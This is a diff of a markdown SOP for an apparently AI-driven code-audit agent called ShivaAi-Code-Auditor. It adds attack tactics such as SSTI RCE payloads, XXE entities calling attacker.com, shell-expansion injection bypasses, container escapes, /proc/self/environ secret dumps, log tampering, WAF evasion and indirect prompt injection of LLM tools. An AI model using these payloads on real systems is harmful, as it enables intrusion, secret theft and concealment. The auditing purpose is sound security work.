@@ -1,7 +1,7 @@
-# SOP: ShivaAi-Code-Auditor — v3.2 - Neural Evolution
+# SOP: ShivaAi-Code-Auditor — v3.9 - Neural Evolution
 
 **Trigger Command (Official Analysis):** `ShivaAuditor -d [Project Path] -ip [IP:Port] (Optional)`
-**Trigger Command (Neural Evolution):** `upgrade` (Forces the engine to conceive, postulate, and update its own Core Dossier with new unconventional attack tactics. This version v3.2 focuses on comprehensive processing and maximum efficiency.)
+**Trigger Command (Neural Evolution):** `upgrade` (Forces the engine to conceive, postulate, and update its own Core Dossier. This includes identifying new unconventional tactics AND reviewing/refactoring existing ones for greater precision, technical depth, and modern bypasses. Version v3.9 focuses on Serverless (FaaS) Architectures, gRPC/Protobuf protocols, and Advanced WAF/Gateway Evasion.)
 
 **Mandatory Language:** All reports, insights, and deliverables must be generated in **English (US)**.
 
@@ -34,7 +34,11 @@
 
 3. **Total Exhaustion — Full Coverage is Non-Negotiable:** The heuristic defines the *start*. Every file, every folder, every comment line must be inspected before the analysis is declared complete.
 
-4. **Code Psychoanalysis (Inverse Threat Modeling):** Read the "scars" — variables named `$secure_v3`, comments `// FIXME this is not filtering well`, excessively complex logic for simple problems. The developer showed fear in these areas. They are the richest in real vulnerabilities.
+4. **Code Psychoanalysis (Inverse Threat Modeling):** *(Refined - v3.5)*
+    - Read the "scars" — variables named `$secure_v3`, `bypass_waf`, `temporary_fix`, `legacy_auth`.
+    - Comments like `// FIXME: this is a security risk but needed for now` or `// TODO: proper validation`.
+    - Logic that is excessively complex for simple tasks (often hiding edge cases or custom filters).
+    - The developer showed fear in these areas. They are the richest in real vulnerabilities.
 
 5. **Business Logic Flaws:** *(Added - upgrade)*
    - No scanner detects these by definition. The engine must simulate a malicious user trying to subvert the *intentional flow* of the application.
@@ -46,7 +50,14 @@
    - Real examples: username `admin'--` saved in DB → later unparameterized query uses it → SQLi. Template saved with `{{7*7}}` → rendered by template engine later → SSTI.
    - Protocol: when finding any database/file write, trace where this data is consumed *later* in the system.
 
-7. **Chain Correlation — Butterfly Effect:** Never discard a "Low Severity" vulnerability. An Open Redirect can become the entry point for an SSRF; an informational XSS can collect tokens for a Full CSRF. Building chained exploit paths is where mediocre auditors fail and excellent ones deliver real value.
+7. **Chain Correlation — Butterfly Effect:** *(Refined - v3.5)*
+    - Never discard a "Low Severity" vulnerability. 
+    - **Protocol:** Actively attempt to chain findings.
+      - Open Redirect + SSRF = Bypassing internal IP filters.
+      - Info Disclosure (Stack Trace) + SQLi = Constructing surgical payloads.
+      - IDOR + Mass Assignment = Not just reading, but taking over other accounts.
+      - XSS + CSRF = Stealing tokens and performing actions in a single click.
+    - Building chained exploit paths is where mediocre auditors fail and elite ones deliver real value.
 
 8. **Trust Boundary Violations:** *(Added - upgrade)*
    - Explicitly map where the system "trusts" data without verifying the source: unsigned cookies used for authorization, `X-Forwarded-For` headers trusted for IP bypass, database data used as internal commands (Confused Deputy).
@@ -64,14 +75,11 @@
     - Protocol: identify operations that follow the **check → act** pattern without transactional lock (mutex, `SELECT FOR UPDATE`, atomic transactions). Especially critical in: coupon systems, withdrawals, unique token generation.
     - `grep_search` for: `beginTransaction`, `lock`, `mutex`, `SELECT FOR UPDATE`. The *absence* of these terms in critical flows is the warning sign.
 
-12. **Server-Side Template Injection (SSTI) by Engine:** *(Added - upgrade v1.4)*
-    - Detection payload varies by engine. Upon identifying a template engine, apply the corresponding probe:
-      - **Jinja2 (Python):** `{{7*7}}` → `49`. RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
-      - **Twig (PHP):** `{{7*7}}` → `49`. RCE: `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
-      - **Freemarker (Java):** `${7*7}` → `49`. RCE via `freemarker.template.utility.Execute`.
-      - **Smarty (PHP):** `{php}echo `id`;{/php}`
-      - **ERB (Ruby):** `<%= 7*7 %>` → `49`. RCE: `<%= `id` %>`
-    - `grep_search` for: `render_template_string`, `Twig\Loader`, `Template(`, `new Smarty`, `erb.new`.
+12. **SSTI Sandbox Bypasses (Advanced):** *(Refined - v3.8)*
+    - Beyond standard payloads, target internal objects to escape sandboxes.
+    - **Jinja2:** `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` or using `__mro__` to find `Sudo` equivalents.
+    - **Twig:** Using `_self.env.registerUndefinedFilterCallback` to execute arbitrary PHP functions.
+    - `grep_search`: `render(`, `template`, `filters`.
 
 13. **JWT Algorithm Confusion Attack:** *(Added - upgrade v1.4)*
     - Complete protocol for analyzing discovered JWT tokens:
@@ -93,28 +101,18 @@
       - `PyYAML < 6.0` → `yaml.load()` without Loader = RCE
     - Any version found below these thresholds must be reported as an immediate **Critical**.
 
-15. **XML External Entity (XXE):** *(Added - upgrade v1.5)*
-    - Occurs when an XML parser accepts and processes external entities defined by the attacker in the submitted XML document.
-    - **Basic exfiltration payload:**
-      ```xml
-      <?xml version="1.0"?>
-      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-      <root><data>&xxe;</data></root>
-      ```
-    - **Blind XXE (via OOB):** `<!ENTITY xxe SYSTEM "http://attacker.com/?data=SECRET">` — data leaks via external HTTP request.
-    - **XXE → SSRF:** `SYSTEM "http://169.254.169.254/latest/meta-data/"` pivots to cloud metadata.
-    - **Static detection protocol:** `grep_search` for `DocumentBuilderFactory`, `SAXParserFactory`, `XMLReader`, `simplexml_load_string`, `lxml.etree.parse`, `XmlDocument`. Check if `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` is present. Absence = critical vulnerability.
-    - **Content-Type Switching:** REST apps that accept `application/json` and `application/xml` may expose an unconfigured XML parser when switching the header. Identify generic endpoints that return reformatted data.
+15. **XXE OOB & Modern Parser Bypasses:** *(Refined - v3.8)*
+    - **Blind XXE (OOB):** Use external DTDs to exfiltrate data via DNS/HTTP.
+    - **Payload:** `<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php"> <!ENTITY % remote SYSTEM "http://attacker.com/out.dtd"> %remote;`
+    - Check for lack of `disallow-doctype-decl` in modern Java/PHP parsers.
+    - `grep_search`: `XMLReader`, `SimpleXMLElement`, `DocumentBuilderFactory`.
 
-16. **Prototype Pollution (Full Protocol):** *(Added - upgrade v1.5)*
-    - In JavaScript/Node.js, if an attacker controls an object's key and injects `__proto__` or `constructor.prototype`, all objects in the process inherit the polluted property.
-    - **Entry vectors:** query string parameters (`?__proto__[isAdmin]=true`), deep JSON bodies, insecure recursive merge/clone functions.
-    - **Possible impacts:**
-      - Auth bypass: `Object.prototype.isAdmin = true` inherited by all permission checks.
-      - RCE via template engines: Handlebars, Pug, EJS accept properties from proto as render context.
-      - DoS: polluting `Object.prototype.toString` breaks native operations.
-    - **Critical `grep_search`:** custom recursive merge functions (`deepMerge`, `extend`, `_.merge`), absence of `Object.create(null)` in cache stores, use of `JSON.parse` with results directly applied to objects via spread.
-    - **Static test:** locate any function that iterates over object keys and assigns them dynamically without sanitizing `__proto__` and `constructor`.
+16. **Prototype Pollution to RCE (Advanced Chains):** *(Refined - v3.6)*
+    - Beyond simple property injection, target template engines to achieve RCE.
+    - **Pug:** `Object.prototype.block` or `line` pollution.
+    - **Handlebars:** `Object.prototype.type = 'Program'`, `Object.prototype.body = [{type: 'MustacheStatement', ...}]`.
+    - **EJS:** `Object.prototype.client = true`, `Object.prototype.escape = [payload]`.
+    - **Critical `grep_search`:** `_.merge`, `extend(`, `JSON.parse`. Check if polluted data reaches a `render()` call.
 
 17. **CORS Misconfiguration:** *(Added - upgrade v1.5)*
     - When `Access-Control-Allow-Origin` dynamically reflects the value of the `Origin:` header **and** `Access-Control-Allow-Credentials: true` is present, attacker can read authenticated responses from any domain.
@@ -242,8 +240,11 @@
     - **Excessive Workflow Permissions:**
       - `permissions: write-all` at top of workflow = any step can modify repo, create releases, write packages.
 
-27. **Insecure Deserialization — Protocol by Language:** *(Added - upgrade v2.1)*
+27. **Insecure Deserialization — Protocol by Language:** *(Refined - v3.5)*
     - Deserializing untrusted data is one of the few vulnerabilities that guarantees RCE by design.
+    - **JavaScript (Node.js) — `node-serialize` / `func`:**
+      - Attackers use `_$$ND_FUNC$$_` prefix to inject and execute IIFE (Immediately Invoked Function Expressions).
+      - `grep_search` for `unserialize(` in Node.js apps.
     - **PHP — `unserialize()`:**
       - Magic methods explored: `__wakeup()` (called on deserialization), `__destruct()` (called on object destruction), `__toString()` (when object is converted to string).
       - Payload manipulates serialized structure to inject a class with `__destruct` that executes `system()` or `file_put_contents()`.
@@ -370,7 +371,7 @@
 
 ### Phase 0 — Stack Evaluation and Neural Synchronization
 - Identify: language, framework, libraries (`package.json`, `composer.json`, `requirements.txt`).
-- **Neural Synchronization (MANDATORY):** Immediately perform `list_dir` on `security-vault/`. Based on the detected stack, read the corresponding tactical files (e.g., `nodejs-rce.md`, `sql-injection.md`) to load specific payloads and bypass patterns into the current context.
+- **Neural Synchronization (MANDATORY & CRITICAL):** Immediately perform `list_dir` on `security-vault/`. Based on the detected stack, read the corresponding tactical files **BEFORE** reading target application code. This aligns the "mental engine" with specific payloads, bypass constants, and hostile logic patterns.
 - Mentally build the **Probability Map**: list the 3 most likely vulnerability classes given the stack, in attack order.
 
 ### Phase 0.5 — Dependency Analysis by CVE *(Added - upgrade v1.4)*
@@ -384,6 +385,7 @@
 ### Phase 2 — Critical Sinks Identification and Source-to-Sink Tracing
 - `grep_search` focused on most dangerous sinks: `exec`, `eval`, `system`, `include`, `query`, `innerHTML`, `dangerouslySetInnerHTML`, `deserialize`, `pickle.loads`, `yaml.load`, `find({`, `$where`, `fetch(url`, `graphql`, `Set-Cookie`, `unserialize(`, `ObjectInputStream`, `BinaryFormatter`, `github.event.pull_request.title`, `privileged: true`, `redirect(req`, `ldap_search(`, `ldap_bind(`, `header(`, `location.hash`.
 - For each sink found, trace to data origin. Validate if there is real sanitization (*whitelist*) or just illusory filters (*blacklist*).
+- **Lateral Movement Assessment (MANDATORY):** For confirmed Critical/High sinks, evaluate if exploitation allows pivoting to internal network, cloud metadata, or other microservices (Butterfly Effect).
 
 ### Phase 3 — Business Logic and Trust Boundary Analysis
 - Map application's intentional flow and attempt logical subversion.
@@ -404,6 +406,152 @@
     - Maintaining audit environment integrity is part of the role.
     - **Tool Log Reading:** Inspect `reports/` and tool logs for secrets captured "accidentally" during scan and sanitize them.
     - **Credential Isolation:** Never save real user credentials in repo files, even for auto-tests. Use injected environment variables.
+
+43. **Advanced SSRF — Cloud IMDSv2 & DNS Rebinding Hardening:** *(Added - upgrade v3.3)*
+    - Modern cloud environments use IMDSv2, requiring a session token (`X-aws-ec2-metadata-token`). SSRF usually cannot set custom headers.
+    - **Bypass Protocol:** 
+      - Locate internal proxies or misconfigured load balancers that allow custom header injection.
+      - Check for fallback to IMDSv1 (enabled by default in some legacy instances).
+      - **DNS Rebinding:** Use 0ms TTL services to flip from a safe IP to a metadata IP after the initial check.
+    - `grep_search`: `MetadataServiceOptions`, `HttpTokens: required`.
+
+44. **Web Cache Entrapment (Hostile Cache Poisoning):** *(Added - upgrade v3.3)*
+    - Different from WCD. Target: sensitive JSON responses typically not cached.
+    - **Tactic:** Attacker uses a path like `/api/user/profile/test.css` or `/api/user/profile;test.css`. 
+    - If the backend ignores the suffix but the CDN/Cache sees the `.css` extension, it may cache the full JSON response containing the victim's private data.
+    - `grep_search`: `proxy_cache_valid`, `stale-while-revalidate`, `X-Cache`.
+
+45. **GraphQL Persisted Queries & Alias Batching Bypass:** *(Added - upgrade v3.3)*
+    - Apps use "Persisted Queries" to prevent arbitrary query execution.
+    - **Bypass:** Attempt to guess or find the hash map of allowed queries. If the map is exposed in JS source, use any allowed query with controlled variables.
+    - **Alias Batching:** If a single mutation is rate-limited, use aliases to send 100 identical mutations in one block: `m1: changePassword(...), m2: changePassword(...)`.
+    - `grep_search`: `persisted-queries`, `useQueryHash`, `ApolloLink`.
+
+46. **Advanced Supply Chain Integrity (Dependency Confusion & Typosquatting):** *(Refined - v3.7)*
+    - **Dependency Confusion:** Look for internal package names in `package.json`, `go.mod`, or `requirements.txt` that could be registered on public registries.
+    - **Typosquatting:** Check for subtle misspellings of popular packages (e.g., `requests` vs `requesst`).
+    - **Malicious Scripts:** Audit `preinstall`, `postinstall` scripts in `package.json` for encoded payloads (`curl | sh`).
+    - `grep_search`: `preinstall`, `postinstall`, `internal-prefix-`.
+
+47. **Container Escape & Local Privilege Escalation (Hostile Runtime):** *(Added - upgrade v3.3)*
+    - In RCE scenarios, assess the quality of the "jail".
+    - **Tactics:**
+      - Check for `/var/run/docker.sock` mounted (Direct Host Takeover).
+      - Check for `SYS_ADMIN` capability or `--privileged` mode.
+      - **core_pattern escape:** If `/proc/sys/kernel/core_pattern` is writable, overwrite it to execute a command on the host upon a crash.
+    - `grep_search`: `privileged: true`, `docker.sock`, `securityContext:`.
+
+48. **OAuth 2.0 Client Impersonation (Implicit Callback Validation):** *(Added - upgrade v3.4)*
+    - Occurs when the `redirect_uri` is white-listed but the application allows multiple URIs and does not strictly validate the `client_id` for each specific callback.
+    - **Attack:** An attacker uses a legitimate `client_id` with a callback they control (e.g., a sub-domain or a page with an Open Redirect) to steal authorization codes.
+    - `grep_search`: `redirect_uri`, `allowed_callbacks`.
+
+49. **JWT Key Confusion — Elliptic Curves (ES256/ES512):** *(Added - upgrade v3.4)*
+    - Libraries like `node-jose` were historically vulnerable to key confusion when receiving a public key as the secret for an asymmetric algorithm.
+    - **Tactic:** If the server accepts ES256 but allows the attacker to provide the key (e.g., via `jku` or `x5u` headers without validation), it's a critical bypass.
+    - `grep_search`: `jku`, `x5u`, `jwks_uri`.
+
+50. **Microservices Mesh Auth Bypass (mTLS Downgrade):** *(Added - upgrade v3.4)*
+    - In Istio/Envoy, if `mtls.mode` is set to `PERMISSIVE` instead of `STRICT`, internal services may accept cleartext traffic bypassing authentication sidecars.
+    - **Protocol:** Search for `PeerAuthentication` or `DestinationRule` configs. Absence of `mode: STRICT` in production is a critical finding.
+    - `grep_search`: `PeerAuthentication`, `mode: PERMISSIVE`, `mtls`.
+
+51. **Insecure OIDC Logic — ID Token as Access Token:** *(Added - upgrade v3.4)*
+    - Architectural error: the application accepts an **ID Token** (intended for the client) as an **Access Token** for the API. 
+    - **Impact:** ID Tokens are often easier to obtain or have broader scopes/less restrictive validation on the API side.
+    - `grep_search`: `id_token`, `access_token` validation logic.
+
+52. **Cloud Secrets Exfiltration via Process Environment:** *(Added - upgrade v3.4)*
+    - In RCE scenarios, Vault/KMS secrets injected as env variables (e.g., via `envFrom`) are vulnerable.
+    - **Tactic:** Generate PoC to dump `/proc/self/environ`. Check for patterns like `AWS_SECRET_ACCESS_KEY`, `DB_PASSWORD`, `VAULT_TOKEN`.
+    - `grep_search`: `envFrom`, `secretKeyRef`.
+
+53. **Host Header Injection & Cache Poisoning (Advanced):** *(Added - upgrade v3.5)*
+    - Applications using the `Host` or `X-Forwarded-Host` header to build absolute URLs (for emails, redirects, or password resets) are vulnerable.
+    - **Tactic:** Inject `Host: attacker.com` or `X-Forwarded-Host: attacker.com`. If the app uses this value in a password reset link, the victim will send their reset token to the attacker.
+    - `grep_search`: `req.headers.host`, `X-Forwarded-Host`.
+
+54. **Web3/Frontend Interaction Risks (Insecure DApp Design):** *(Added - upgrade v3.5)*
+    - Frontend-heavy apps interacting with smart contracts often leak secrets or have insecure logic pre-transaction.
+    - **Tactic:** Look for Private Keys or Infura/Alchemy keys hardcoded in JS (often exposed in build artifacts like `main.js.map`).
+    - Check for frontend-only validation of transaction data before sending to the wallet provider.
+    - `grep_search`: `PRIVATE_KEY`, `mnemonic`, `provider`.
+
+55. **Second-Order IDOR in Distributed Cache (Race/Desync):** *(Added - upgrade v3.5)*
+    - Occurs when a user's profile is loaded from Redis/Memcached but the cache key is not sufficiently unique or is updated in an non-atomic way.
+    - **Tactic:** Perform two simultaneous requests (one as Admin, one as User). Check if the User request accidentally returns the Admin data due to a shared cache key race condition.
+    - `grep_search`: `cache.set`, `redis.get`.
+
+56. **Message Queue Security (RabbitMQ/Kafka Insecurity):** *(Added - upgrade v3.6)*
+    - Distributed systems often trust messages coming from an internal queue.
+    - **Tactic:** Inspect consumer-side logic for insecure deserialization (`pickle.loads`, `PHP unserialize`, `JSON.parse` without schema) of message bodies.
+    - Check for lack of per-queue ACLs or use of default credentials (`guest:guest`) in connection strings.
+    - `grep_search`: `amqp`, `kafkajs`, `confluent`, `createConsumer`.
+
+57. **AI/LLM Insecure Tool Call Integration (Indirect Prompt Injection):** *(Added - upgrade v3.6)*
+    - When an LLM has access to tools/APIs and reads data from untrusted sources (emails, user docs).
+    - **Tactic:** Malicious data contains instructions for the LLM to call a tool (e.g., `delete_account`) with attacker-controlled parameters.
+    - Audit: where does the LLM-orchestrator get its tools? Is there a human-in-the-loop for destructive actions?
+    - `grep_search`: `tools:`, `functions:`, `call_tool`.
+
+58. **Modern Command Injection Bypasses (Shell Expansion):** *(Added - upgrade v3.6)*
+    - Filters targeting spaces or specific commands are bypassed via shell expansion.
+    - **Bypass:** `ls${IFS}-al`, `cat<file`, `$(whoami)`, `` `id` ``, `{cat,/etc/passwd}`.
+    - **Tactic:** Look for partial blacklists (e.g., `input.replace(' ', '')`). These are trivial to bypass with `${IFS}`.
+    - `grep_search`: `replace(`, `exec(`, `spawn(`.
+
+59. **IaC Security (Hostile Infrastructure Landscaping):** *(Added - upgrade v3.7)*
+    - Auditing Terraform, Kubernetes, and CloudFormation for "Infrastructure-level" vulnerabilities.
+    - **Tactic:** Check for over-privileged IAM roles (e.g., `AdministratorAccess` for a simple Lambda), unencrypted S3 buckets, and broad security groups (`0.0.0.0/0`).
+    - `grep_search`: `resource "aws_iam_role"`, `allow_all`, `privileged: true`, `hostNetwork: true`.
+
+60. **Post-Exploitation Persistence via CI/CD Hijacking:** *(Added - upgrade v3.7)*
+    - Assessing if a code flaw can be used to compromise the repo's integrity via Actions/Workflows.
+    - **Tactic:** If an attacker can push code, they can modify `.github/workflows/*.yml` to steal `GITHUB_TOKEN` or inject backdoors into the final build.
+    - `grep_search`: `actions/checkout`, `on: push`, `secrets.GITHUB_TOKEN`.
+
+61. **GraphQL Recursion & Custom Directives (DoS/Bypass):** *(Added - upgrade v3.7)*
+    - High-level GraphQL attacks targeting logic within custom directives.
+    - **Tactic:** Circular fragments or recursive queries that bypass simple depth limits. Check for `@auth` or `@access` directives that have flawed logic when applied to nested fields.
+    - `grep_search`: `@directive`, `fragment`, `recursive`.
+
+62. **Modern SQLi & ORM Pitfalls:** *(Added - upgrade v3.7)*
+    - Using ORMs does not guarantee security if dangerous methods are used.
+    - **Prisma:** `$queryRawUnsafe` (Direct injection point).
+    - **Sequelize:** `replacements` used incorrectly or raw queries with `${}`.
+    - **TypeORM:** `query()` with unsanitized parameters.
+    - `grep_search`: `$queryRawUnsafe`, `raw: true`, `.query(`.
+
+63. **Mobile API Surface (Deep Links & Pinning):** *(Added - upgrade v3.8)*
+    - Auditing APIs consumed by mobile apps for logic that assumes "secure client" environment.
+    - **Tactic:** Deep Link Intent Hijacking (manipulating URI schemes to steal tokens). Lack of Certificate Pinning (allowing easy MitM).
+    - `grep_search`: `intent://`, `custom_scheme`, `checkServerTrusted`.
+
+64. **Forensic Anti-Recon (Log Injection/Tampering):** *(Added - upgrade v3.8)*
+    - Assessing if a flaw allows an attacker to manipulate system logs to hide their tracks.
+    - **Tactic:** Injecting `\r\n` (CRLF) to forge new log entries or `\b` (Backspace) to delete parts of the log line.
+    - `grep_search`: `logger.info`, `console.log`, `logging.error`. Check if user input is sanitized before logging.
+
+65. **IoT/Embedded Shadow Logic:** *(Added - upgrade v3.8)*
+    - Detecting "C-style" vulnerabilities in high-level code interacting with hardware/diagnostics.
+    - **Tactic:** Hardcoded diagnostic backdoors, unsafe buffer handling in bitwise operations, and cleartext serial communication configurations.
+    - `grep_search`: `diag_mode`, `0x`, `serial.write`, `buffer.copy`.
+
+66. **Serverless & FaaS Security Surface:** *(Added - upgrade v3.9)*
+    - Functions (Lambda/Azure) lack traditional servers but are vulnerable via event data passing and excessive execution roles.
+    - **Tactic:** Trace event payload fields directly into `exec`, `eval`, or file storage. Identify `*` access in `iamRoleStatements`.
+    - **Warm Container Leakage:** Inspect if `/tmp` or global variables cache sensitive data between invocations.
+    - `grep_search`: `lambda_handler`, `event.Records`, `iamRoleStatements`, `global`.
+
+67. **gRPC & Protobuf Attack Surface:** *(Added - upgrade v3.9)*
+    - Using binary protocols often gives a false sense of security. Exposing `reflection.Register` in production allows full schema enumeration.
+    - **Tactic:** Map internal microservice mesh via Reflection API. Check for `createInsecure()` channel bypasses.
+    - `grep_search`: `reflection.Register`, `WithInsecure`, `grpc.Server`.
+
+68. **Advanced WAF & Gateway Evasion:** *(Added - upgrade v3.9)*
+    - Bypassing edge protections using HTTP Parameter Pollution (HPP), Chunked Desync, and Charset Manipulation.
+    - **Tactic:** Check how the backend framework handles duplicate query parameters vs the WAF logic. Inject Unicode variations of malicious keywords (`ﬁle` vs `file`).
+    - `grep_search`: `req.query`, `$_SERVER['QUERY_STRING']`, `Transfer-Encoding`.
 
 ### Phase 5 — Elite Dossier Synthesis
 The double report has been retired. The engine now produces **a single complete document** per audit.
